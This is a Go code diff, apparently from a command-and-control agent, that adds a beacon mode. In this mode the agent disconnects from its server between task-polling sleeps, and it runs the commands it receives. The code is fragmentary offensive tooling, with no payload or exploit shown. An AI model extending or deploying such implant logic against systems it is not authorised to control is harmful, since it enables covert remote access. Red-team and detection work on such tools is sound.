@@ -2,6 +2,7 @@ package agent
 
 import (
 	"encoding/json"
+	"fmt"
 	"log"
 	"numinon_shadow/internal/models"
 	"time"
@@ -48,6 +49,16 @@ func (a *Agent) runHttpLoop() error {
 			if !taskResp.TaskAvailable {
 				log.Println("|AGENT LOOP HTTP|-> No task from server, going back to sleep.")
 				time.Sleep(sleepDuration)
+				// RIGHT BEFORE WE SLEEP WE DISCONNECT
+				if a.config.BeaconMode {
+					log.Println("|AGENT LOOP HTTP|-> Beacon Mode is ENABLED, calling Disconnect()")
+					err := a.communicator.Disconnect()
+					if err != nil {
+						fmt.Println("|AGENT LOOP HTTP|-> Beacon Mode failed to called Disconnect")
+					}
+
+				}
+				// ENDS HERE
 				continue
 			}
 
@@ -58,6 +69,17 @@ func (a *Agent) runHttpLoop() error {
 				log.Printf("|AGENT LOOP HTTP|-> Task received (ID: %s, Cmd: %s). Executing...", taskResp.TaskID, taskResp.Command)
 				a.executeTask(taskResp) // Execute the task (which will send results internally)
 			}
+
+			// RIGHT BEFORE WE SLEEP WE DISCONNECT
+			if a.config.BeaconMode {
+				log.Println("|AGENT LOOP HTTP|-> Beacon Mode is ENABLED, calling Disconnect()")
+				err := a.communicator.Disconnect()
+				if err != nil {
+					fmt.Println("|AGENT LOOP HTTP|-> Beacon Mode failed to called Disconnect")
+				}
+
+			}
+			// ENDS HERE
 
 			log.Printf("|AGENT LOOP HTTP|-> Sleeping for %v...", sleepDuration)
 			time.Sleep(sleepDuration)
